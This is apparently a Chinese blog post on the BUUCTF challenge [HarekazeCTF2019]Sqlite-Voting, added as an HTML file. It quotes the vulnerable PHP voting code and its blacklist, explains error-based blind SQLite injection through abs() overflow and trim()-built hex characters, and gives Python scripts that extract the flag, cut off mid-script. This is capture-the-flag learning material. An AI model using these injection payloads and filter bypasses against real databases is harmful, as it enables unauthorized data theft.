@@ -1,0 +1,519 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://odiws.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://odiws.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://odiws.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="buuctf,对sqlite的sql注入" />
+
+
+<link rel="canonical" href="http://odiws.github.io/2024/11/08/HarekazeCTF2019-Sqlite-Voting/">
+
+
+
+  <title>
+[HarekazeCTF2019]Sqlite-Voting - 刷题笔记 |
+zty153’s_blog = Hexo</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">[HarekazeCTF2019]Sqlite-Voting
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2024-11-08 19:35:34">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-11-08T19:35:34+08:00">2024-11-08</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">zty153’s_blog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?850591"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?581324"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?502305"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?770984"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?143187"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?526744"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="item" rel="index" title="In 刷题笔记"><span itemprop="name">刷题笔记</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2024/11/08/HarekazeCTF2019-Sqlite-Voting/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="odiws">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h3 id="harekazectf2019sqlite-voting"><a class="anchor" href="#harekazectf2019sqlite-voting">#</a> [HarekazeCTF2019]Sqlite-Voting</h3>
+<p>直接给的源码：</p>
+<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token comment">// dangerous chars</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token comment">// " % ' * + / &lt; = > \ _ ` ~ -</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token string double-quoted-string">"[\"%'*+\\/&lt;=>\\\\_`~-]"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token comment">// whitespace chars</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token string single-quoted-string">'\s'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token comment">// dangerous functions</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token string single-quoted-string">'blob'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'load_extension'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'char'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'unicode'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token string single-quoted-string">'(in|sub)str'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[lr]trim'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'like'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'glob'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'match'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'regexp'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token string single-quoted-string">'in'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'limit'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'order'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'union'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'join'</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/json; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token comment">// check user input</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'You must specify vote id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Vote id contains dangerous chars'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token comment">// update database</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sqlite:../db/vote.db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'An error occurred while updating database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token comment">// succeeded!</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span></pre></td></tr><tr><td data-num="48"></td><td><pre>  <span class="token string single-quoted-string">'message'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Thank you for your vote! The result will be published after the CTF finished.'</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></pre></td></tr></table></figure><p>当 update 查询成功时，返回 <code>An error occurred while updating database</code> ，否则返回 <code>An error occurred while updating database</code> ，可以通过构造报错进行 bool 注入</p>
+<h4 id="sqlite"><a class="anchor" href="#sqlite">#</a> sqlite：</h4>
+<pre><code>如果X是整数-9223372036854775808，则abs(X)引发整数溢出错误
+</code></pre>
+<h4 id="sqlite常规注入"><a class="anchor" href="#sqlite常规注入">#</a> sqlite 常规注入：</h4>
+<p>sqlite 有一张系统表 <code>sqlite_master</code> ，其中两个字段 <code>name</code> ， <code>sql</code>  分别是所有表的表名，和表的结构（包括列名）<br />
+sqlite 中没有 <code>ascii</code> ，用 <code>unicode</code>  代替</p>
+<h4 id="题解"><a class="anchor" href="#题解">#</a> 题解</h4>
+<h5 id="先爆出flag的长度"><a class="anchor" href="#先爆出flag的长度">#</a> 先爆出 flag 的长度：</h5>
+<p>先考虑对 flag16 进制长度的判断，假设它的长度为 x,y 表示 2 的 n 次方，那么 x&amp;y 就能表现出 x 二进制为 1 的位置，将这些 y 再进行或运算就可以得到完整的 x 的二进制，也就得到了 flag 的长度，而 1&lt;&lt;n 恰可以表示 2 的 n 次方</p>
+<p>那么如何构造报错语句呢？在 sqlite3 中，abs 函数有一个整数溢出的报错，如果 abs 的参数是 - 9223372036854775808 就会报错，同样如果是正数也会报错<br />
+利用脚本判断 flag 长度</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://42d6c14f-e97e-4c02-ba69-81757f96aea0.node4.buuoj.cn:81/vote.php"</span></pre></td></tr><tr><td data-num="3"></td><td><pre>l <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'abs(case(length(hex((select(flag)from(flag))))&amp;</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">)when(0)then(0)else(0x8000000000000000)end)'</span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>  data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>      <span class="token string">'id'</span> <span class="token punctuation">:</span> payload</pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>  r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">if</span> <span class="token string">'occurred'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>      l <span class="token operator">=</span> l<span class="token operator">|</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>n</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span></pre></td></tr></table></figure><p>这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 ABCDEF ，这样十六进制的所有字符都可以使用了，并且使用 trim (0,0) 来表示空字符</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># hex(b'zebra') = 7A65627261</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token comment"># 除去 12567 就是 A ，其余同理</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  A <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>  C <span class="token operator">=</span> <span class="token string">'trim(hex(typeof(.1)),12567)'</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>  D <span class="token operator">=</span> <span class="token string">'trim(hex(0xffffffffffffffff),123)'</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>  E <span class="token operator">=</span> <span class="token string">'trim(hex(0.1),1230)'</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>  F <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token comment"># hex(b'koala') = 6B6F616C61</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token comment"># 除去 16CF 就是 B</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>  B <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>C<span class="token punctuation">&#125;</span></span><span class="token string">||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>F<span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span></pre></td></tr></table></figure><p>然后逐字符进行爆破，已经知道 flag 格式为 flag {} ,hex (b'flag {')==666C61677B , 在其后面逐位添加十六进制字符，构成 paylaod</p>
+<p>再利用 replace (length (replace (flag,payload,''))),84,'') 这个语句进行判断</p>
+<p>如果 flag 不包含 payload, 那么得到的 length 必为 84, 最外面的 replace 将返回 false , 通过 case when then else 构造 abs 参数为 0 , 它不报错</p>
+<p>如果 flag 包含 payload , 那么 replace (flag, payload, '') 将 flag 中的 payload 替换为空，得到的 length 必不为 84, 最外面的 replace 将返回 true , 通过 case when then else 构造 abs 参数为 0x8000000000000000 令其报错</p>
+<p>exp:</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># coding: utf-8</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> binascii <span class="token comment">#处理十六进制编码</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> requests <span class="token comment">#向服务器发送 HTTP 请求</span></pre></td></tr><tr><td data-num="4"></td><td><pre>URL <span class="token operator">=</span> <span class="token string">'http://9519b34e-ed57-44c1-9b3d-f10029f33915.node5.buuoj.cn:81/vote.php'</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#确定 flag 的长度</span></pre></td></tr><tr><td data-num="7"></td><td><pre>l <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="8"></td><td><pre>i <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'abs(case(length(hex((select(flag)from(flag))))&amp;</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">)when(0)then(0)else(0x8000000000000000)end)'</span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">if</span> <span class="token string">b'An error occurred'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    l <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> j</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] length:'</span><span class="token punctuation">,</span> l<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">#这个表格定义了一些复杂的 SQL 表达式，将字符 A-F 转换成 SQL 表达式。稍后用于在猜测 flag 内容时替代字母 A-F。</span></pre></td></tr><tr><td data-num="18"></td><td><pre>table <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>table<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span></pre></td></tr><tr><td data-num="20"></td><td><pre>table<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(typeof(.1)),12567)'</span></pre></td></tr><tr><td data-num="21"></td><td><pre>table<span class="token punctuation">[</span><span class="token string">'D'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0xffffffffffffffff),123)'</span></pre></td></tr><tr><td data-num="22"></td><td><pre>table<span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0.1),1230)'</span></pre></td></tr><tr><td data-num="23"></td><td><pre>table<span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span></pre></td></tr><tr><td data-num="24"></td><td><pre>table<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">[</span><span class="token string">"C"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">[</span><span class="token string">"F"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token comment">#这个部分是核心，通过每次添加一个字符，逐字符地推测 flag 的内容。</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token comment"># res 初始化为 flag &#123; 的十六进制编码。</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment"># 使用循环遍历 0-9 和 A-F 字符集。</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token comment"># 每次构造一个 SQL 查询，根据响应推测下一个字符的十六进制值。</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token comment"># 如果推测正确，res 就会添加该字符。</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment"># 最终的输出为解码后的 flag。</span></pre></td></tr><tr><td data-num="32"></td><td><pre>res <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span><span class="token string">b'flag&#123;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">'0123456789ABCDEF'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    t <span class="token operator">=</span> <span class="token string">'||'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>c <span class="token keyword">if</span> c <span class="token keyword">in</span> <span class="token string">'0123456789'</span> <span class="token keyword">else</span> table<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> res <span class="token operator">+</span> x<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>      <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'abs(case(replace(length(replace(hex((select(flag)from(flag))),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>t<span class="token punctuation">&#125;</span></span><span class="token string">,trim(0,0))),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>l<span class="token punctuation">&#125;</span></span><span class="token string">,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span></span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">if</span> <span class="token string">b'An error occurred'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="41"></td><td><pre>      res <span class="token operator">+=</span> x</pre></td></tr><tr><td data-num="42"></td><td><pre>      <span class="token keyword">break</span></pre></td></tr><tr><td 